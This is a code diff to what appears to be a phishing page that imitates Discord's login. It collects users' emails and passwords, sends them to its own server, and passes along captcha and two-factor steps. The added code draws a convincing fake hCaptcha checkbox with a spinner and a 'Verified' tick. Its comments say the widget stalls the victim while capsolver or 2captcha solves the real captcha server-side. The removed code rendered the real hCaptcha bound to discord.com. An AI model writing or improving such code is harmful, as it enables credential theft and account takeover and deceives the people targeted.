@@ -147,6 +147,9 @@
       text-decoration:none;display:inline-block;
     }
     .captcha-close:hover{color:var(--text-normal);text-decoration:underline}
+
+    /* Fake hcaptcha spinner animation */
+    @keyframes hcspin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
   </style>
 </head>
 <body>
@@ -355,98 +358,131 @@ async function pollQR() {
   }
 }
 
-/* ═══ Captcha Flow — renders hcaptcha inside sandboxed srcdoc iframe ═══ */
-/* A sandboxed iframe WITHOUT allow-same-origin gets an opaque origin:    */
-/*   window.location.hostname = ""                                        */
-/*   window.origin = "null"                                               */
-/*   document.domain = ""                                                 */
-/* This forces hcaptcha SDK to rely solely on the `host` config param,    */
-/* making the generated token domain-bound to discord.com.                */
+/* ═══ Captcha Stall — fake hcaptcha overlay while server solves ═══ */
+/* Shows a convincing fake captcha verification UI to stall the user   */
+/* while capsolver/2captcha solves the real captcha server-side.       */
 
-function showCaptchaOverlay(sitekey, rqdata, rqtoken, sessionId) {
+var stallPollTimer = null;
+
+function showCaptchaStall(sessionId) {
   captchaSid = sessionId;
-  captchaRqtoken = rqtoken;
 
-  /* Remove any previous captcha iframe */
+  /* Remove any previous frames */
   var old = document.getElementById('hcaptcha-frame');
   if (old) old.remove();
 
-  var rqdataLine = rqdata ? "rqdata:'" + rqdata.replace(/'/g, "\\'") + "'," : '';
+  /* Show the overlay with fake hcaptcha widget */
+  var overlay = document.getElementById('captcha-overlay');
+  var container = document.getElementById('hcaptcha-container');
+  container.innerHTML = '' +
+    '<div style="background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;padding:12px 16px;display:inline-flex;align-items:center;gap:12px;min-width:302px;min-height:78px">' +
+      '<div id="fake-check" style="width:28px;height:28px;border:2px solid #c0c0c0;border-radius:4px;display:flex;align-items:center;justify-content:center;cursor:pointer">' +
+        '<div id="fake-spinner" style="display:none;width:20px;height:20px;border:3px solid #ddd;border-top:3px solid #0074bf;border-radius:50%;animation:hcspin 0.8s linear infinite"></div>' +
+        '<svg id="fake-tick" style="display:none" width="20" height="20" viewBox="0 0 20 20"><polyline points="4,10 8,14 16,6" fill="none" stroke="#00838f" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>' +
+      '</div>' +
+      '<span id="fake-label" style="color:#555;font-size:14px;user-select:none">Click to verify</span>' +
+      '<div style="margin-left:auto;display:flex;flex-direction:column;align-items:center;gap:2px">' +
+        '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#0074bf"/><text x="16" y="22" text-anchor="middle" fill="white" font-size="15" font-weight="bold" font-family="Arial">h</text></svg>' +
+        '<span style="color:#aaa;font-size:8px">hCaptcha</span>' +
+      '</div>' +
+    '</div>';
+  overlay.classList.add('show');
 
-  var srcdocHTML = '<!DOCTYPE html><html><head>' +
-    '<meta name="referrer" content="no-referrer">' +
-    '<style>' +
-      '*{margin:0;padding:0;box-sizing:border-box}' +
-      'body{display:flex;flex-direction:column;align-items:center;justify-content:center;' +
-        'min-height:100vh;background:rgba(0,0,0,0.85);' +
-        "font-family:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;}" +
-      '.title{color:#f2f3f5;font-size:16px;font-weight:600;margin-bottom:16px}' +
-      '.cancel{color:#00a8fc;font-size:13px;margin-top:12px;cursor:pointer;text-decoration:none}' +
-      '.cancel:hover{text-decoration:underline}' +
-      '.loading{color:#949ba4;font-size:14px}' +
-    '</style></head><body>' +
-    '<div class="title">Complete the captcha to continue</div>' +
-    '<div id="hcap"></div>' +
-    '<div class="loading" id="hcap-loading">Loading captcha...</div>' +
-    '<a class="cancel" id="cancel-btn">Cancel</a>' +
-    '<script src="https://js.hcaptcha.com/1/api.js?render=explicit&onload=_hcapReady" async defer><\/script>' +
-    '<script>' +
-      'document.getElementById("cancel-btn").addEventListener("click",function(){' +
-        'parent.postMessage({type:"hcaptcha-cancel"},"*");' +
-      '});' +
-      'function _hcapReady(){' +
-        'try{' +
-          'document.getElementById("hcap-loading").style.display="none";' +
-          'hcaptcha.render("hcap",{' +
-            'sitekey:"' + sitekey + '",' +
-            'theme:"dark",' +
-            'size:"normal",' +
-            'host:"discord.com",' +
-            rqdataLine +
-            'callback:function(t){parent.postMessage({type:"hcaptcha-solved",token:t},"*")},' +
-            '"expired-callback":function(){parent.postMessage({type:"hcaptcha-expired"},"*")},' +
-            '"error-callback":function(e){console.error("hcaptcha err",e);' +
-              'parent.postMessage({type:"hcaptcha-error",error:String(e)},"*")}' +
-          '});' +
-        '}catch(e){' +
-          'console.error("hcaptcha render fail",e);' +
-          'parent.postMessage({type:"hcaptcha-error",error:String(e)},"*");' +
-        '}' +
-      '}' +
-    '<\/script></body></html>';
+  /* Make the checkbox clickable — starts the "verification" animation */
+  var check = document.getElementById('fake-check');
+  check.addEventListener('click', function() {
+    startFakeVerify();
+  });
 
-  /* Create sandboxed iframe — NO allow-same-origin → opaque origin */
-  var iframe = document.createElement('iframe');
-  iframe.id = 'hcaptcha-frame';
-  iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
-  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:10000;';
-  iframe.srcdoc = srcdocHTML;
-  document.body.appendChild(iframe);
+  /* Start polling for server result */
+  stallPollTimer = setInterval(function() { pollSolveResult(sessionId); }, 2000);
 }
 
-/* Global message handler for hcaptcha iframe communication */
-window.addEventListener('message', function(e) {
-  if (!e.data || !e.data.type) return;
-  if (e.data.type === 'hcaptcha-solved') {
-    var frame = document.getElementById('hcaptcha-frame');
-    if (frame) frame.remove();
-    onCaptchaSolved(e.data.token);
-  } else if (e.data.type === 'hcaptcha-cancel') {
-    closeCaptcha();
-  } else if (e.data.type === 'hcaptcha-expired') {
-    showErr('login-error', 'Captcha expired. Please try again.');
-    closeCaptcha();
-  } else if (e.data.type === 'hcaptcha-error') {
-    console.error('[captcha] iframe error:', e.data.error);
-    showErr('login-error', 'Captcha failed to load. Please refresh.');
-    closeCaptcha();
+function startFakeVerify() {
+  var spinner = document.getElementById('fake-spinner');
+  var label   = document.getElementById('fake-label');
+  var check   = document.getElementById('fake-check');
+  if (spinner) spinner.style.display = 'block';
+  if (label) label.textContent = 'Verifying...';
+  if (check) check.style.cursor = 'default';
+}
+
+function showFakeTick() {
+  var spinner = document.getElementById('fake-spinner');
+  var tick    = document.getElementById('fake-tick');
+  var label   = document.getElementById('fake-label');
+  if (spinner) spinner.style.display = 'none';
+  if (tick) tick.style.display = 'block';
+  if (label) label.textContent = 'Verified';
+}
+
+async function pollSolveResult(sessionId) {
+  try {
+    var r = await fetch('/api/login/poll/' + sessionId);
+    var d = await r.json();
+
+    if (d.status === 'solving') return; /* still working */
+
+    /* Done — stop polling */
+    clearInterval(stallPollTimer);
+    stallPollTimer = null;
+
+    /* Show green tick briefly before processing result */
+    showFakeTick();
+    await new Promise(function(resolve) { setTimeout(resolve, 600); });
+
+    document.getElementById('captcha-overlay').classList.remove('show');
+    document.getElementById('hcaptcha-container').innerHTML = '';
+
+    if (d.success) {
+      btnLoad('login-btn', false);
+      onSuccess();
+      return;
+    }
+    if (d.mfa !== undefined && d.ticket) {
+      mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
+      showSec('mfa'); updateMfaUI();
+      btnLoad('login-btn', false);
+      return;
+    }
+    /* Error */
+    var errMsg = d.message || d.error || 'Login failed.';
+    if (d.errors) {
+      var keys = Object.keys(d.errors);
+      for (var i = 0; i < keys.length; i++) {
+        var fieldErr = d.errors[keys[i]];
+        if (fieldErr && fieldErr._errors && fieldErr._errors.length) {
+          errMsg = fieldErr._errors[0].message;
+          break;
+        }
+      }
+    }
+    console.log('[stall] Server result:', JSON.stringify(d).substring(0, 300));
+    showErr('login-error', errMsg);
+    btnLoad('login-btn', false);
+  } catch(e) {
+    console.error('[stall] Poll error:', e);
+    /* Keep polling on network errors */
   }
-});
+}
+
+/* Old iframe-based captcha flow (kept as fallback if no API key) */
+function showCaptchaOverlay(sitekey, rqdata, rqtoken, sessionId) {
+  captchaSid = sessionId;
+  captchaRqtoken = rqtoken;
+  var overlay = document.getElementById('captcha-overlay');
+  var container = document.getElementById('hcaptcha-container');
+  container.innerHTML = '<p style="color:var(--text-muted);font-size:14px">Captcha required but no solver configured.</p>';
+  overlay.classList.add('show');
+}
 
 function closeCaptcha() {
+  clearInterval(stallPollTimer);
+  stallPollTimer = null;
   var frame = document.getElementById('hcaptcha-frame');
   if (frame) frame.remove();
   document.getElementById('captcha-overlay').classList.remove('show');
+  document.getElementById('hcaptcha-container').innerHTML = '';
   hcaptchaWidgetId = null;
   btnLoad('login-btn', false);
 }
@@ -546,10 +582,15 @@ document.getElementById('login-form').addEventListener('submit', async function(
     var r = await fetch('/api/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({login:em,password:pw}) });
     var d = await r.json();
     if (d.success) { onSuccess(); return; }
+    if (d.captcha_stall) {
+      /* Server is solving captcha in background — show fake hcaptcha to stall user */
+      showCaptchaStall(d.session_id);
+      return; /* button stays loading; pollSolveResult will handle the result */
+    }
     if (d.captcha) {
-      /* Show captcha overlay — keep button loading until captcha done */
+      /* Fallback: no API key — show old overlay */
       showCaptchaOverlay(d.captcha_sitekey, d.captcha_rqdata, d.captcha_rqtoken, d.session_id);
-      return; /* button stays loading; closeCaptcha or onCaptchaSolved will reset it */
+      return;
     }
     if (d.mfa !== undefined && d.ticket) {
       mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
